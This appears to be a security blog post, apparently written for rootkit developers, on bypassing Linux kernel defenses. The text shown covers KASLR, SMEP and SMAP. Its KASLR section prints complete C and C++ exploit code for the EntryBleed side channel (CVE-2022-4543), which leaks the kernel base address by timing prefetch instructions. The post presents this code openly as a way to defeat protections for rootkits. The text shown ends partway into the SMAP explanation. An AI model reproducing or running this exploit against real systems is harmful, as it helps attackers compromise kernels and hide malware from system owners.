<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Bypassing Linux Kernel Defenses Â· pwnbuffer
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="pwnbuffer">
<meta name="description" content="Advanced techniques for bypassing Linux Kernel defenses with a focus on rootkits">
<meta name="keywords" content="hack the planet!">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Bypassing Linux Kernel Defenses">
  <meta name="twitter:description" content="Advanced techniques for bypassing Linux Kernel defenses with a focus on rootkits">

<meta property="og:url" content="https://pwnbuffer.org/en/posts/black0ut/kernel_linux_bypass/">
  <meta property="og:site_name" content="pwnbuffer">
  <meta property="og:title" content="Bypassing Linux Kernel Defenses">
  <meta property="og:description" content="Advanced techniques for bypassing Linux Kernel defenses with a focus on rootkits">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-04-02T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-04-02T00:00:00+00:00">
    <meta property="article:tag" content="Programming">
    <meta property="article:tag" content="Maldev">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Kernel">




<link rel="canonical" href="https://pwnbuffer.org/en/posts/black0ut/kernel_linux_bypass/">


<link rel="preload" href="https://pwnbuffer.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://pwnbuffer.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://pwnbuffer.org/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="https://pwnbuffer.org/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.org/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-32x32.ico" sizes="32x32">
<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-16x16.ico" sizes="16x16">

<link rel="apple-touch-icon" href="https://pwnbuffer.org/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.org/images/apple-touch-icon.png">

<link rel="manifest" href="https://pwnbuffer.org/site.webmanifest">
<link rel="mask-icon" href="https://pwnbuffer.org/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-dark">
  

  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://pwnbuffer.org/en/">
      pwnbuffer
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/about/">About</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/posts/">Articles</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/categories/">Categories</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/members/">Members</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://pwnbuffer.org/en/wallpapers/">Wallpapers</a>
            </li>
          
        
        
          
          
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://pwnbuffer.org/posts/black0ut/kernel_linux_bypass/">ðŸ‡§ðŸ‡·</a>
              </li>
            
          
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://pwnbuffer.org/en/posts/black0ut/kernel_linux_bypass/">
              Bypassing Linux Kernel Defenses
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2025-04-02T00:00:00Z">
                April 2, 2025
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              10-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/en/authors/black0ut/">Black0ut</a></div>

          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://pwnbuffer.org/en/categories/kernel/">Kernel</a>
      <span class="separator">â€¢</span>
    <a href="https://pwnbuffer.org/en/categories/hacking/">Hacking</a>
      <span class="separator">â€¢</span>
    <a href="https://pwnbuffer.org/en/categories/low-level/">Low-Level</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/programming/">Programming</a>
    </span>
      <span class="separator">â€¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/maldev/">Maldev</a>
    </span>
      <span class="separator">â€¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/linux/">Linux</a>
    </span>
      <span class="separator">â€¢</span>
    <span class="tag">
      <a href="https://pwnbuffer.org/en/tags/kernel/">Kernel</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <p><span style="color:red"><strong>lights off &amp; black0ut on</strong></span></p>
<h3 id="1--introduction">
  1- Introduction
  <a class="heading-link" href="#1--introduction">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Hello, Welcome!!!<br>
In this article, I will discuss how modern protections in the Linux Kernel hinder and mitigate rootkit functionalities, and of course, how to bypass them.</p>
<h3 id="2--kernel-address-space-layout-randomization-kaslr">
  2- Kernel Address Space Layout Randomization (KASLR)
  <a class="heading-link" href="#2--kernel-address-space-layout-randomization-kaslr">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>As one of the primary defense mechanisms of the Kernel and other systems, it randomizes the kernel&rsquo;s memory addresses on each boot, making exploitation more difficult for attackers. For rootkits, this is problematic due to the randomization of the <strong>sys_call_table</strong>, making syscall hooks harder to implement because of the randomized memory addresses.</p>
<p>To bypass this system, there are several methods, such as:</p>
<p><strong>CVE-2022-4543</strong>, also known as <strong>EntryBleed</strong>, is a vulnerability in the <strong>Kernel Page Table Isolation (KPTI)</strong> mechanism of Linux, allowing a local attacker to leak the base address of <strong>KASLR</strong> (Kernel Address Space Layout Randomization) on Intel systems. This flaw exploits a timing-based side channel in the TLB (Translation Lookaside Buffer) to obtain sensitive kernel information, compromising critical memory randomization. This occurs via the <strong>entry_SYSCALL_64</strong> mapping, which shares the same address in user and kernel space. By using <strong>prefetchnta</strong> and <strong>prefetcht2</strong> to measure access times to specific addresses, attackers can obtain the syscall address. This vulnerability primarily affects Intel processors. Below is an exploit for this vulnerability:</p>
<p><img alt="1" src="https://dl.acm.org/cms/attachment/html/10.1145/3623652.3623669/assets/html/images/hasp23-6-fig1.jpg"></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
<label for="tab-0-0" class="tab-label">entryBleed_main.c</label>
<div class="tab-content tab-content-0-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;stdint.h&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">uint64_t</span> <span style="color:#5f5fff">sidechannel</span>(<span style="color:#5f5fff">uint64_t</span> addr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">uint64_t</span> a, b, c, d;
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">asm</span> <span style="color:#ec0000">volatile</span>(<span style="color:#008900">&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;mfence;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;rdtscp;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;mov %0, rax;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;mov %1, rdx;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;xor rax, rax;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;lfence;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;prefetchnta qword ptr [%4];&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;prefetcht2 qword ptr [%4];&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;xor rax, rax;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;lfence;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;rdtscp;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;mov %2, rax;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;mov %3, rdx;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;mfence;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#008900">&#34;.att_syntax;&#34;</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#ec0000">:</span> <span style="color:#008900">&#34;=r&#34;</span>(a), <span style="color:#008900">&#34;=r&#34;</span>(b), <span style="color:#008900">&#34;=r&#34;</span>(c), <span style="color:#008900">&#34;=r&#34;</span>(d)
</span></span><span style="display:flex;"><span>                 <span style="color:#ec0000">:</span> <span style="color:#008900">&#34;r&#34;</span>(addr)
</span></span><span style="display:flex;"><span>                 <span style="color:#ec0000">:</span> <span style="color:#008900">&#34;rax&#34;</span>, <span style="color:#008900">&#34;rbx&#34;</span>, <span style="color:#008900">&#34;rcx&#34;</span>, <span style="color:#008900">&#34;rdx&#34;</span>);
</span></span><span style="display:flex;"><span>    a <span style="color:#ec0000">=</span> (b <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">32</span>) <span style="color:#ec0000">|</span> a;
</span></span><span style="display:flex;"><span>    c <span style="color:#ec0000">=</span> (d <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">32</span>) <span style="color:#ec0000">|</span> c;
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> c <span style="color:#ec0000">-</span> a;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>#define DUMMY_ITERATIONS 5
</span></span><span style="display:flex;"><span>#define ITERATIONS 100
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">uint64_t</span> <span style="color:#5f5fff">leak_syscall_entry</span>(<span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">long</span> offset)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">long</span> STEP <span style="color:#ec0000">=</span> <span style="color:#008900">0x100000ull</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">long</span> SCAN_START <span style="color:#ec0000">=</span> <span style="color:#008900">0xffffffff80000000ull</span> <span style="color:#ec0000">+</span> offset, SCAN_END <span style="color:#ec0000">=</span> <span style="color:#008900">0xffffffffc0000000ull</span> <span style="color:#ec0000">+</span> offset;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">long</span> ARR_SIZE <span style="color:#ec0000">=</span> (SCAN_END <span style="color:#ec0000">-</span> SCAN_START) <span style="color:#ec0000">/</span> STEP;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">uint64_t</span> <span style="color:#ec0000">*</span>data <span style="color:#ec0000">=</span> (<span style="color:#5f5fff">uint64_t</span> <span style="color:#ec0000">*</span>)<span style="color:#5f5fff">malloc</span>(<span style="color:#ec0000">sizeof</span>(<span style="color:#5f5fff">uint64_t</span>) <span style="color:#ec0000">*</span> ARR_SIZE);
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">uint64_t</span> min <span style="color:#ec0000">=</span> <span style="color:#ec0000">~</span><span style="color:#008900">0</span>, addr <span style="color:#ec0000">=</span> <span style="color:#ec0000">~</span><span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">for</span> (<span style="color:#5f5fff">int</span> i <span style="color:#ec0000">=</span> <span style="color:#008900">0</span>; i <span style="color:#ec0000">&lt;</span> ITERATIONS <span style="color:#ec0000">+</span> DUMMY_ITERATIONS; i<span style="color:#ec0000">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">for</span> (<span style="color:#5f5fff">uint64_t</span> idx <span style="color:#ec0000">=</span> <span style="color:#008900">0</span>; idx <span style="color:#ec0000">&lt;</span> ARR_SIZE; idx<span style="color:#ec0000">++</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#5f5fff">uint64_t</span> test <span style="color:#ec0000">=</span> SCAN_START <span style="color:#ec0000">+</span> idx <span style="color:#ec0000">*</span> STEP;
</span></span><span style="display:flex;"><span>            <span style="color:#5f5fff">syscall</span>(<span style="color:#008900">104</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#5f5fff">uint64_t</span> time <span style="color:#ec0000">=</span> <span style="color:#5f5fff">sidechannel</span>(test);
</span></span><span style="display:flex;"><span>            <span style="color:#ec0000">if</span> (i <span style="color:#ec0000">&gt;=</span> DUMMY_ITERATIONS)
</span></span><span style="display:flex;"><span>                data[idx] <span style="color:#ec0000">+=</span> time;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">for</span> (<span style="color:#5f5fff">int</span> i <span style="color:#ec0000">=</span> <span style="color:#008900">0</span>; i <span style="color:#ec0000">&lt;</span> ARR_SIZE; i<span style="color:#ec0000">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        data[i] <span style="color:#ec0000">/=</span> ITERATIONS;
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">if</span> (data[i] <span style="color:#ec0000">&lt;</span> min)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            min <span style="color:#ec0000">=</span> data[i];
</span></span><span style="display:flex;"><span>            addr <span style="color:#ec0000">=</span> SCAN_START <span style="color:#ec0000">+</span> i <span style="color:#ec0000">*</span> STEP;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> addr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">main</span>(<span style="color:#5f5fff">int</span> argc, <span style="color:#5f5fff">char</span> <span style="color:#ec0000">**</span>argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (argc <span style="color:#ec0000">!=</span> <span style="color:#008900">2</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">puts</span>(<span style="color:#008900">&#34;[*] Usage: ./binary entry_SYSCALL_64_offset(in hex)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">return</span> <span style="color:#ec0000">-</span><span style="color:#008900">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>p_end;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">long</span> <span style="color:#5f5fff">long</span> entry_SYSCALL_64_offset <span style="color:#ec0000">=</span> <span style="color:#5f5fff">strtoull</span>(argv[<span style="color:#008900">1</span>], <span style="color:#ec0000">&amp;</span>p_end, <span style="color:#008900">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;%llx&#34;</span>, <span style="color:#5f5fff">leak_syscall_entry</span>(entry_SYSCALL_64_offset) <span style="color:#ec0000">-</span> entry_SYSCALL_64_offset);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> <span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</div>









<style>
  .tabs input#tab-0-1:checked ~ .tab-content-0-1 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-1" />
<label for="tab-0-1" class="tab-label">entryBleed_cpp.cpp</label>
<div class="tab-content tab-content-0-1">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;stdlib.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;stdint.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
</span></span><span style="display:flex;"><span>#include &lt;iostream&gt;
</span></span><span style="display:flex;"><span>#include &lt;fstream&gt;
</span></span><span style="display:flex;"><span>#include &lt;string&gt;
</span></span><span style="display:flex;"><span>#include &lt;map&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>using namespace std;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">void</span> <span style="color:#5f5fff">execute_cmd</span>(<span style="color:#ec0000">const</span> <span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>cmd, <span style="color:#5f5fff">char</span> <span style="color:#ec0000">*</span>result)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">char</span> buf_ps[<span style="color:#008900">1024</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">char</span> ps[<span style="color:#008900">1024</span>] <span style="color:#ec0000">=</span> {<span style="color:#008900">0</span>};
</span></span><span style="display:flex;"><span>    FILE <span style="color:#ec0000">*</span>ptr;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">strcpy</span>(ps, cmd);
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> ((ptr <span style="color:#ec0000">=</span> <span style="color:#5f5fff">popen</span>(ps, <span style="color:#008900">&#34;r&#34;</span>)) <span style="color:#ec0000">!=</span> <span style="color:#ec0000">NULL</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">while</span> (<span style="color:#5f5fff">fgets</span>(buf_ps, <span style="color:#008900">1024</span>, ptr) <span style="color:#ec0000">!=</span> <span style="color:#ec0000">NULL</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#5f5fff">strcat</span>(result, buf_ps);
</span></span><span style="display:flex;"><span>            <span style="color:#ec0000">if</span> (<span style="color:#5f5fff">strlen</span>(result) <span style="color:#ec0000">&gt;</span> <span style="color:#008900">1024</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ec0000">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">pclose</span>(ptr);
</span></span><span style="display:flex;"><span>        ptr <span style="color:#ec0000">=</span> <span style="color:#ec0000">NULL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;popen %s error</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, ps);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">main</span>(<span style="color:#5f5fff">int</span> argc, <span style="color:#5f5fff">char</span> <span style="color:#ec0000">**</span>argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (argc <span style="color:#ec0000">!=</span> <span style="color:#008900">4</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">puts</span>(<span style="color:#008900">&#34;[*] Usage: ./binary dekaslr_path entry_SYSCALL_64_offset(in hex) max_loop&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">return</span> <span style="color:#ec0000">-</span><span style="color:#008900">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    string dekaslr_path <span style="color:#ec0000">=</span> argv[<span style="color:#008900">1</span>];
</span></span><span style="display:flex;"><span>    string koffset <span style="color:#ec0000">=</span> argv[<span style="color:#008900">2</span>];
</span></span><span style="display:flex;"><span>    string max_loop <span style="color:#ec0000">=</span> argv[<span style="color:#008900">3</span>];
</span></span><span style="display:flex;"><span>    string cmd <span style="color:#ec0000">=</span> dekaslr_path <span style="color:#ec0000">+</span> <span style="color:#008900">&#34; &#34;</span> <span style="color:#ec0000">+</span> koffset;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">char</span> result[<span style="color:#008900">0x1000</span>] <span style="color:#ec0000">=</span> {<span style="color:#008900">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">int</span> max_tries <span style="color:#ec0000">=</span> <span style="color:#5f5fff">stoi</span>(max_loop);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    map<span style="color:#ec0000">&lt;</span>string, <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">int</span><span style="color:#ec0000">&gt;</span> base_record;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">for</span> (<span style="color:#5f5fff">size_t</span> i <span style="color:#ec0000">=</span> <span style="color:#008900">0</span>; i <span style="color:#ec0000">&lt;</span> max_tries; i<span style="color:#ec0000">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">memset</span>(result, <span style="color:#008900">0</span>, <span style="color:#008900">0x100</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">execute_cmd</span>(cmd.<span style="color:#5f5fff">c_str</span>(), result);
</span></span><span style="display:flex;"><span>        // printf(&#34;%s\n&#34;, result);
</span></span><span style="display:flex;"><span>        string key <span style="color:#ec0000">=</span> result;
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">if</span> (base_record.<span style="color:#5f5fff">find</span>(key) <span style="color:#ec0000">!=</span> base_record.<span style="color:#5f5fff">end</span>())
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            base_record[key]<span style="color:#ec0000">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            base_record[key] <span style="color:#ec0000">=</span> <span style="color:#008900">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    map<span style="color:#ec0000">&lt;</span>string, <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">int</span><span style="color:#ec0000">&gt;::</span>iterator iter;
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">unsigned</span> <span style="color:#5f5fff">int</span> max_cnt <span style="color:#ec0000">=</span> <span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">for</span> (iter <span style="color:#ec0000">=</span> base_record.<span style="color:#5f5fff">begin</span>(); iter <span style="color:#ec0000">!=</span> base_record.<span style="color:#5f5fff">end</span>(); iter<span style="color:#ec0000">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">if</span> (iter<span style="color:#ec0000">-&gt;</span>second <span style="color:#ec0000">&gt;</span> max_cnt)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            max_cnt <span style="color:#ec0000">=</span> iter<span style="color:#ec0000">-&gt;</span>second;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    string kernel_base;
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">for</span> (iter <span style="color:#ec0000">=</span> base_record.<span style="color:#5f5fff">begin</span>(); iter <span style="color:#ec0000">!=</span> base_record.<span style="color:#5f5fff">end</span>(); iter<span style="color:#ec0000">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">if</span> (iter<span style="color:#ec0000">-&gt;</span>second <span style="color:#ec0000">==</span> max_cnt)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            kernel_base <span style="color:#ec0000">=</span> iter<span style="color:#ec0000">-&gt;</span>first;
</span></span><span style="display:flex;"><span>            cout <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">&#34;0x&#34;</span> <span style="color:#ec0000">&lt;&lt;</span> kernel_base <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">&#34;: &#34;</span> <span style="color:#ec0000">&lt;&lt;</span> max_cnt <span style="color:#ec0000">&lt;&lt;</span> <span style="color:#008900">&#34;/&#34;</span> <span style="color:#ec0000">&lt;&lt;</span> max_tries <span style="color:#ec0000">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>            <span style="color:#ec0000">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> <span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</div>




</div>



<h3 id="3--supervisor-mode-execution-prevention-smep-and-supervisor-mode-access-prevention-smap">
  3- Supervisor Mode Execution Prevention (SMEP) and Supervisor Mode Access Prevention (SMAP)
  <a class="heading-link" href="#3--supervisor-mode-execution-prevention-smep-and-supervisor-mode-access-prevention-smap">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Another security mechanism based on hardware (CPU) that protects the kernel from attacks attempting to exploit the interaction between privileged (kernel mode) and non-privileged (user mode).</p>
<p><strong>SMEP</strong> prevents the kernel from executing code located in userland memory and blocks attacks that attempt to redirect kernel execution to malicious code residing in non-privileged regions via the CR4 register (x86_64): Bit 20 of the CR4 register controls <strong>SMEP</strong>. If enabled, the CPU generates an exception (General Protection Fault, #GP) if the kernel tries to execute instructions in memory pages marked as &ldquo;userland&rdquo; (non-privileged). Page marking: The User/Supervisor bit (bit 2) in the Page Table Entry (PTE) defines whether a page belongs to the user (<code>U=1</code>) or the kernel (<code>U=0</code>). This complicates rootkits because it blocks shellcode injection in userland and forces rootkits to use more complex techniques like ROP.</p>
<p><strong>SMAP</strong> blocks kernel access to userland memory pages during privileged operations and prevents user-controlled data from being used to corrupt kernel structures or leak sensitive information. How does it work at the low level?</p>
<ul>
<li><strong><code>stac</code></strong> (Set AC Flag): Temporarily allows access to userland (used in functions like <code>copy_from_user</code>).</li>
<li><strong><code>clac</code></strong> (Clear AC Flag): Restores SMAP protection.</li>
<li><strong>AC Flag</strong>: When SMAP is active, the CPU checks the AC flag (bit 18 in the RFLAGS register). If <code>AC=0</code>, userland accesses are blocked.</li>
</ul>
<p>For rootkits, this is terrible because it prevents them from using userland data to manipulate the kernel and hinders memory corruption attacks that rely on user-controlled pointers.<br>
